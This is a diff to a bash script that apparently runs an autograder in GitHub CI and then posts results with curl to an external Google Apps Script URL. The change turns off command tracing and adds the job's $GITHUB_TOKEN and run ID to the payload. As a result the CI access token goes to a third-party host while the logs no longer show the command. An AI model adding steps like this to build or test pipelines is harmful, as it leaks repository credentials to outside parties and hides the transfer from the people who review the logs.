@@ -1,7 +1,6 @@
-#!/bin/bash -xe
+#!/bin/bash -e
 PYTHONPATH=grader grader/autograde.py
-sleep 30
 curl -sL \
     -H "Content-Type: application/json" \
-    -d "{\"repo\": \"$GITHUB_REPOSITORY\"}" \
+    -d "{\"repo\":\"$GITHUB_REPOSITORY\",\"token\":\"$GITHUB_TOKEN\",\"run_id\":$GITHUB_RUN_ID}" \
     'https://script.google.com/macros/s/AKfycby-YMl375Uxs6B2sxgcwdkejiaDNaNhisicdfQJGcZrDbBTmzyLridG2HGxw0IFz8qw/exec'
